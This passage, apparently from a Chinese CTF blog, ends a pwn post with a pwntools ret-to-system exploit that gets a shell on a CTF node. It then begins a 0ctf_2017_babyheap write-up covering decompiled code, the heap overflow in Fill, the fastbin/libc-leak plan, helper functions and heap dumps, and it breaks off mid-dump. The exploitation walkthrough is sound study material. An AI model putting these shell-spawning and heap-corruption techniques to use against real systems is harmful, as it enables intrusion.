<p>payload &#x3D; b’a’*0x168 + p64(flag_addr)<br> #dbg()<br>p.sendlineafter(“Input:”,”backdoor”)<br>pause()<br>p.sendlineafter(‘Input: ‘,payload)<br>p.sendlineafter(‘Input: ‘,’exitexit’)</p>
<p>p.interactive()</p>
<h3 id="WUSTCTF-2020-getshell2"><a href="#WUSTCTF-2020-getshell2" class="headerlink" title="[WUSTCTF 2020]getshell2"></a>[WUSTCTF 2020]getshell2</h3><p>tips: p32(system_plt) + p32(0) + p32(str_binsh) 可以替换成 p32(call_system) + p32(str_sh)<br> 这是因为 call system 指令执行后会被当前 eip 寄存器的值压栈，所以在 p32(system_plt) + p32(0) +  p32(str_binsh) 中我们用 p32(0) 作为 eip 寄存器的值进入栈中。那么我们使用 call system 指令的时候就不需要 p32(0) 作为 eip 寄存器的值进入栈中（call system 指令会自动实现将当前 eip  寄存器的值压栈），所以该指令后面直接跟参数<br> 同样的，在 linux 中，&#x2F;bin&#x2F;sh 是二进制文件，而 sh 是环境变量，相当于执行 &#x2F;bin&#x2F;sh</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p=remote(<span class="string">&#x27;node3.anna.nssctf.cn&#x27;</span>,<span class="number">28711</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./service&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x1c</span> + p32(<span class="number">0x08048529</span>) + p32(<span class="built_in">next</span>(elf.search(<span class="string">b&#x27;sh\x00&#x27;</span>)))</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>刷题</tag>
      </tags>
  </entry>
  <entry>
    <title>pwn堆题刷题记录</title>
    <url>/2023/04/10/pwn%E5%A0%86%E9%A2%98%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<h1 id="堆问题"><a href="#堆问题" class="headerlink" title="堆问题"></a>堆问题</h1><h2 id="0ctf-2017-babyheap"><a href="#0ctf-2017-babyheap" class="headerlink" title="0ctf_2017_babyheap"></a>0ctf_2017_babyheap</h2><p>前言：buu刷题遇到到第一道堆题，是我刷题到目前为止遇到到最大的挑战，我也是看了很多wp才逐渐理解这道题的思路，希望可以慢慢前进吧</p>
<h3 id="分析："><a href="#分析：" class="headerlink" title="分析："></a>分析：</h3><h4 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h4><h5 id="1-chesksec查看保护机制："><a href="#1-chesksec查看保护机制：" class="headerlink" title="1.chesksec查看保护机制："></a>1.chesksec查看保护机制：</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[*] <span class="string">&#x27;/home/fanfan/pwn challenges/heap/babyheap_0ctf_2017&#x27;</span>    </span><br><span class="line">Arch:     amd64-64-little     </span><br><span class="line">RELRO:    Full RELRO     </span><br><span class="line">Stack:    Canary found     </span><br><span class="line">NX:       NX enabled     </span><br><span class="line">PIE:      PIE enabled </span><br></pre></td></tr></table></figure>

<p>保护全开，那必然就要想办法泄漏出 libc 基地址的偏移量来实现调用其他函数</p>
<h5 id="2-运行程序："><a href="#2-运行程序：" class="headerlink" title="2.运行程序："></a>2.运行程序：</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">===== Baby Heap <span class="keyword">in</span> 2017 ===== </span><br><span class="line">1. Allocate </span><br><span class="line">2. Fill </span><br><span class="line">3. Free </span><br><span class="line">4. Dump </span><br><span class="line">5. Exit Command:</span><br></pre></td></tr></table></figure>

<p>菜单题，几个功能分别是分配、填充、释放和输出</p>
<h5 id="3-拖入-IDA-64bit-分析："><a href="#3-拖入-IDA-64bit-分析：" class="headerlink" title="3.拖入 IDA 64bit 分析："></a>3.拖入 IDA 64bit 分析：</h5><p><strong>main</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(__int64 a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *v4; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = sub_B70();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    menu();</span><br><span class="line">    <span class="keyword">switch</span> ( get_number() )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1LL</span>:</span><br><span class="line">        add((__int64)v4);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2LL</span>:</span><br><span class="line">        edit(v4);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3LL</span>:</span><br><span class="line">        free_0(v4);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4LL</span>:</span><br><span class="line">        show(v4);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5LL</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后看一下sub_B70()函数（为了便于分析，我已经将其中有些匿名函数重命名了）</p>
<p><strong>sub_B70()</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> *<span class="title function_">sub_B70</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> fd; <span class="comment">// [rsp+4h] [rbp-3Ch]</span></span><br><span class="line">  <span class="type">char</span> *addr; <span class="comment">// [rsp+8h] [rbp-38h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+10h] [rbp-30h]</span></span><br><span class="line">  __int64 buf[<span class="number">4</span>]; <span class="comment">// [rsp+20h] [rbp-20h] BYREF</span></span><br><span class="line"></span><br><span class="line">  buf[<span class="number">3</span>] = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(_bss_start, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  alarm(<span class="number">0x3C</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;===== Baby Heap in 2017 =====&quot;</span>);</span><br><span class="line">  fd = open(<span class="string">&quot;/dev/urandom&quot;</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( fd &lt; <span class="number">0</span> || read(fd, buf, <span class="number">0x10</span>uLL) != <span class="number">16</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  close(fd);</span><br><span class="line">  addr = (<span class="type">char</span> *)((buf[<span class="number">0</span>] % <span class="number">0x555555543000</span>uLL + <span class="number">0x10000</span>) &amp; <span class="number">0xFFFFFFFFFFFFF000</span>LL);</span><br><span class="line">  v3 = (buf[<span class="number">1</span>] % <span class="number">0xE80</span>uLL) &amp; <span class="number">0xFFFFFFFFFFFFFFF0</span>LL;</span><br><span class="line">  <span class="keyword">if</span> ( mmap(addr, <span class="number">0x1000</span>uLL, <span class="number">3</span>, <span class="number">34</span>, <span class="number">-1</span>, <span class="number">0LL</span>) != addr )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  <span class="keyword">return</span> &amp;addr[v3];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>有个mmp函数，整个函数就是获取一块空间</p>
<blockquote>
<p>mmp函数：将硬盘上的一块区域映射为虚拟内存</p>
<p>void *mmap(void addr, size_t length, int prot, int flags, int fd, off_t offset); 创建共享内存映射 </p>
<p>参数： </p>
<p>addr： 指定映射区的首地址。通常传NULL，表示让系统自动分配  </p>
<p>length：共享内存映射区的大小。（&lt;&#x3D; 文件的实际大小，通常为文件大小）  </p>
<p>prot： 共享内存映射区的读写属性。PROT_READ（读）、PROT_WRITE（写）、PROT_READ|PROT_WRITE（读写） </p>
<p>flags： 标注共享内存的共享属性。</p>
<p>MAP_SHARED（共享，会将映射区所做的操作反映到物理设备（磁盘）上。）  MAP_PRIVATE（私有，映射区所做的修改不会反映到物理设备。 ）  </p>
<p>fd: 用于创建共享内存映射区的那个文件的 文件描述符.</p>
<p>offset：默认0，表示映射文件全部。偏移位置。需是 4k 的整数倍。</p>
<p>返回值：  成功：映射区的首地址。</p>
<p>失败：MAP_FAILED (void(-1))， error</p>
</blockquote>
<p>接下来看一下菜单里的各个函数</p>
<p><strong>1.allocate</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall <span class="title function_">add</span><span class="params">(__int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="type">int</span> number; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">void</span> *v3; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">15</span>; ++i )<span class="comment">//循环16次，也就是存在16块可用地址空间</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !*(_DWORD *)(<span class="number">24LL</span> * i + a1) )<span class="comment">//判断该空间是否被使用</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Size: &quot;</span>);</span><br><span class="line">      number = get_number();<span class="comment">//输入size大小</span></span><br><span class="line">      <span class="keyword">if</span> ( number &gt; <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( number &gt; <span class="number">4096</span> )<span class="comment">//输入的size要在0和4096之间</span></span><br><span class="line">          number = <span class="number">4096</span>;</span><br><span class="line">        v3 = <span class="built_in">calloc</span>(number, <span class="number">1uLL</span>);<span class="comment">//获得size大小的内存空间，calloc会将会将内存数据置为0</span></span><br><span class="line">        <span class="keyword">if</span> ( !v3 )</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">-1</span>);<span class="comment">//获取失败则推出</span></span><br><span class="line">        *(_DWORD *)(<span class="number">24LL</span> * i + a1) = <span class="number">1</span>;<span class="comment">//将该内存标记为1，即已经用了</span></span><br><span class="line">        *(_QWORD *)(a1 + <span class="number">24LL</span> * i + <span class="number">8</span>) = number;</span><br><span class="line">        *(_QWORD *)(a1 + <span class="number">24LL</span> * i + <span class="number">16</span>) = v3;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Allocate Index %d\n&quot;</span>, (<span class="type">unsigned</span> <span class="type">int</span>)i);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>void *calloc(size_t nitems, size_t size) 分配所需的内存空间，并返回一个指向它的指针。malloc 和 calloc 之间的不同点是，malloc 不会设置内存为零，而 calloc 会设置分配的内存为零。</p>
<p>参数</p>
<p>nitems – 要被分配的元素个数。</p>
<p>size – 元素的大小</p>
<p>返回值</p>
<p>该函数返回一个指针，指向已分配的内存。如果请求失败，则返回 NULL。</p>
</blockquote>
<p>该函数大概就是申请一块size内存，将内存信息写入，简单化一下结构图：</p>
<p>![](<a href="https://cdn.jsdelivr.net/gh/jangfan/picb@main/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE">https://cdn.jsdelivr.net/gh/jangfan/picb@main/屏幕截图</a> 2023-04-04 173941.png)</p>
<p><strong>2.FILL（存在漏洞！）</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">edit</span><span class="params">(__int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">  result = get_number();<span class="comment">//获取需要填充的index</span></span><br><span class="line">  v2 = result;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)result &lt;= <span class="number">0xF</span> )<span class="comment">//判断索引是否在范围之内</span></span><br><span class="line">  &#123;</span><br><span class="line">    result = *(<span class="type">unsigned</span> <span class="type">int</span> *)(<span class="number">24LL</span> * (<span class="type">int</span>)result + a1);</span><br><span class="line">    <span class="keyword">if</span> ( (_DWORD)result == <span class="number">1</span> )<span class="comment">//判断index是否已经被使用过</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Size: &quot;</span>);</span><br><span class="line">      result = get_number();<span class="comment">//获取填充字节大小</span></span><br><span class="line">      v3 = result;</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="type">int</span>)result &gt; <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Content: &quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> sub_11B2(*(_QWORD *)(<span class="number">24LL</span> * v2 + a1 + <span class="number">16</span>), v3);<span class="comment">//填充指向的堆空间，大小为刚输入的大小，sub_11B2时写的一个读取函数，一个一个读取</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个函数大致上就是堆idx的块设置size，并填入context</p>
<p>这里就出现一个问题，在Allcate中我们输入size申请一块大小size大小的内存，但是Fill函数又让我们输入一遍size，然后读size大小的数据到该区域指向的内存空间。这存在很大问题，若我们fill输入size无限大，就可以把堆撑爆，存在漏洞！</p>
<p><strong>3.Free</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_F50</span><span class="params">(__int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">  result = get_number();</span><br><span class="line">  v2 = result;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)result &lt;= <span class="number">0xF</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = *(<span class="type">unsigned</span> <span class="type">int</span> *)(<span class="number">24LL</span> * (<span class="type">int</span>)result + a1);</span><br><span class="line">    <span class="keyword">if</span> ( (_DWORD)result == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      *(_DWORD *)(<span class="number">24LL</span> * v2 + a1) = <span class="number">0</span>;</span><br><span class="line">      *(_QWORD *)(<span class="number">24LL</span> * v2 + a1 + <span class="number">8</span>) = <span class="number">0LL</span>;</span><br><span class="line">      <span class="built_in">free</span>(*(<span class="type">void</span> **)(<span class="number">24LL</span> * v2 + a1 + <span class="number">16</span>));</span><br><span class="line">      result = <span class="number">24LL</span> * v2 + a1;</span><br><span class="line">      *(_QWORD *)(result + <span class="number">16</span>) = <span class="number">0LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>释放idx的块，将该区域使用位置为0，并将指针指为0，即指针跟着释放</p>
<p><strong>4.Dump</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">show</span><span class="params">(__int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">  result = get_number();</span><br><span class="line">  v2 = result;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)result &lt;= <span class="number">0xF</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = *(_DWORD *)(<span class="number">24LL</span> * result + a1);</span><br><span class="line">    <span class="keyword">if</span> ( result == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Content: &quot;</span>);</span><br><span class="line">      sub_130F(*(_QWORD *)(<span class="number">24LL</span> * v2 + a1 + <span class="number">16</span>), *(_QWORD *)(<span class="number">24LL</span> * v2 + a1 + <span class="number">8</span>));</span><br><span class="line">      <span class="keyword">return</span> <span class="built_in">puts</span>(byte_14F1);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>打印idx的块内容</p>
<h4 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h4><h5 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h5><p>fill中的size可以重新设置，故可以造成堆溢出。</p>
<p>使用两次double free与fastbin attack，通过unsorted bin的特性，若unsorted bin中只有一个chunk的时候，这个chunk的fd和bk指针存放的都是main_arena+88,我们可以这获得libc的基地址</p>
<h5 id="获取libc的基址"><a href="#获取libc的基址" class="headerlink" title="获取libc的基址"></a>获取libc的基址</h5><p>libc的基址通过unsorted bin的特性获得，只要申请一块较大的chunk，并free掉，该chunk的fd和bk地址便可用来计算。因此我们要获得被free掉的chunk内容，而dump函数就算输出chunk内容。因此要使得两个指针指向同一个较大的chunk块，将其中一个指针chunk释放，另一个使用dump获取地址内存</p>
<h4 id="动态调试"><a href="#动态调试" class="headerlink" title="动态调试"></a>动态调试</h4><h5 id="根据题目情况构造好交互函数"><a href="#根据题目情况构造好交互函数" class="headerlink" title="根据题目情况构造好交互函数"></a>根据题目情况构造好交互函数</h5><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p=process(<span class="string">&#x27;./babyheap_0ctf_2017&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    attach(p)</span><br><span class="line">    pause()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">allo</span>(<span class="params">size</span>):</span><br><span class="line">	p.recvuntil(<span class="string">&quot;Command: &quot;</span>)</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">	p.recvuntil(<span class="string">&quot;Size: &quot;</span>)</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fill</span>(<span class="params">idx,size,content</span>):</span><br><span class="line">	p.recvuntil(<span class="string">&quot;Command: &quot;</span>)</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">	p.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">	p.recvuntil(<span class="string">&quot;Size: &quot;</span>)</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">	p.recvuntil(<span class="string">&quot;Content: &quot;</span>)</span><br><span class="line">	p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">	p.recvuntil(<span class="string">&quot;Command: &quot;</span>)</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">	p.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dump</span>(<span class="params">idx</span>):</span><br><span class="line">	p.recvuntil(<span class="string">&quot;Command: &quot;</span>)</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">	p.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(idx))</span><br></pre></td></tr></table></figure>

<h5 id="首先申请初始块"><a href="#首先申请初始块" class="headerlink" title="首先申请初始块"></a>首先申请初始块</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">allo(<span class="number">0x10</span>)<span class="comment">#0 方便修改第1，2块</span></span><br><span class="line">allo(<span class="number">0x10</span>)<span class="comment">#1</span></span><br><span class="line">allo(<span class="number">0x10</span>)<span class="comment">#2</span></span><br><span class="line">allo(<span class="number">0x10</span>)<span class="comment">#3 方便修改0x80堆块</span></span><br><span class="line">allo(<span class="number">0x80</span>)<span class="comment">#4</span></span><br></pre></td></tr></table></figure>



<p>![](<a href="https://cdn.jsdelivr.net/gh/jangfan/picb@main/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE">https://cdn.jsdelivr.net/gh/jangfan/picb@main/屏幕截图</a> 2023-04-06 105316.png)</p>
<p>![](<a href="https://cdn.jsdelivr.net/gh/jangfan/picb@main/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE">https://cdn.jsdelivr.net/gh/jangfan/picb@main/屏幕截图</a> 2023-04-06 110020.png)</p>
<p>这里遇到了些许版本问题，因为2.23libc版本中没有tcachebins，但是我的ubuntu的libc版本是2.26的，所以本地动态调试的时候会出现不同.于是我就学习了一下怎样更换elf文件的glibc，这里简单记一下，需要的两个工具：patchelf和glibc-all-in-one</p>
<blockquote>
<p>安装完毕后，首先使用glibc-all-in-one现在题目对应的gilbc</p>
<p>.&#x2F;download (cat list后所显示的gilbc各种版本中所需要的版本)</p>
<p>下载好的glibc在lib文件夹中，然后复制ld文件到pwn题目录下,此命令我是在题目终端下执行的,题目文件夹下面应该有这三个文件</p>
<p>然后ldd 对应题目查看glibc和ld</p>
<p>替换libc文件，设置ld文件</p>
<p>patchelf –replace-needed libc.so.6 .&#x2F;libc-2.23.so .&#x2F;babyheap_0ctf_2017<br>————————-原本的libc—-要替换的libc—–pwn文件       </p>
<p>patchelf –set-interpreter .&#x2F;ld-2.23.so .&#x2F;babyheap_0ctf_2017 </p>
<p>—————————对应的ld文件—-pwn文件</p>
</blockquote>
<p>然后继续</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x56052e116000</span><br><span class="line">Size: 0x21</span><br><span class="line"><span class="comment">#1</span></span><br><span class="line">Free chunk (fastbins) | PREV_INUSE</span><br><span class="line">Addr: 0x56052e116020</span><br><span class="line">Size: 0x21</span><br><span class="line">fd: 0x00</span><br><span class="line"><span class="comment">#2 指向块1，先进后出 为doublefree做准备</span></span><br><span class="line">Free chunk (fastbins) | PREV_INUSE</span><br><span class="line">Addr: 0x56052e116040</span><br><span class="line">Size: 0x21</span><br><span class="line">fd: 0x56052e116020</span><br><span class="line"><span class="comment">#3</span></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x56052e116060</span><br><span class="line">Size: 0x21</span><br><span class="line"><span class="comment">#4</span></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x56052e116080</span><br><span class="line">Size: 0x91</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x56052e116110</span><br><span class="line">Size: 0x20ef1</span><br><span class="line"></span><br><span class="line">pwndbg&gt; x/50gx 0x55c755e0d000</span><br><span class="line">0x55c755e0d000: 0x0000000000000000      0x0000000000000021</span><br><span class="line">0x55c755e0d010: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55c755e0d020: 0x0000000000000000      0x0000000000000021</span><br><span class="line">0x55c755e0d030: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55c755e0d040: 0x0000000000000000      0x0000000000000021</span><br><span class="line">0x55c755e0d050: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55c755e0d060: 0x0000000000000000      0x0000000000000021</span><br><span class="line">0x55c755e0d070: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55c755e0d080: 0x0000000000000000      0x0000000000000091</span><br><span class="line">0x55c755e0d090: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55c755e0d0a0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55c755e0d0b0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55c755e0d0c0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55c755e0d0d0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55c755e0d0e0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55c755e0d0f0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55c755e0d100: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55c755e0d110: 0x0000000000000000      0x0000000000020ef1</span><br><span class="line">0x55c755e0d120: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55c755e0d130: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55c755e0d140: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55c755e0d150: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55c755e0d160: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55c755e0d170: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55c755e0d180: 0x0000000000000000      0x0000000000000000</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">free(<span class="number">1</span>) </span><br><span class="line">free(<span class="number">2</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; heap                                   </span><br><span class="line">Allocated chunk | PREV_INUSE                   </span><br><span class="line">Addr: 0x555f4fda7000</span><br><span class="line">Size: 0x21</span><br><span class="line"><span class="comment">#1</span></span><br><span class="line">Free chunk (fastbins) | PREV_INUSE</span><br><span class="line">Addr: 0x555f4fda7020</span><br><span class="line">Size: 0x21</span><br><span class="line">fd: 0x00</span><br><span class="line"><span class="comment">#2</span></span><br><span class="line">Free chunk (fastbins) | PREV_INUSE</span><br><span class="line">Addr: 0x555f4fda7040</span><br><span class="line">Size: 0x21</span><br><span class="line">fd: 0x555f4fda7020</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555f4fda7060</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555f4fda7080</span><br><span class="line">Size: 0x91</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555f4fda7110</span><br><span class="line">Size: 0x20ef1</span><br><span class="line"></span><br><span class="line">pwndbg&gt; bins</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x555f4fda7040 —▸ 0x555f4fda7020 ◂— 0x0<span class="comment">#2指向块1</span></span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x0</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line">pwndbg&gt; x/50gx  0x555f4fda7000</span><br><span class="line">0x555f4fda7000: 0x0000000000000000      0x0000000000000021</span><br><span class="line">0x555f4fda7010: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555f4fda7020: 0x0000000000000000      0x0000000000000021</span><br><span class="line">0x555f4fda7030: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555f4fda7040: 0x0000000000000000      0x0000000000000021</span><br><span class="line">0x555f4fda7050: 0x0000555f4fda7020      0x0000000000000000</span><br><span class="line">0x555f4fda7060: 0x0000000000000000      0x0000000000000021</span><br><span class="line">0x555f4fda7070: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555f4fda7080: 0x0000000000000000      0x0000000000000091</span><br><span class="line">0x555f4fda7090: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555f4fda70a0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555f4fda70b0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555f4fda70c0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555f4fda70d0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555f4fda70e0: 0x0000000000000000      0x0000000000000000</span><br><span 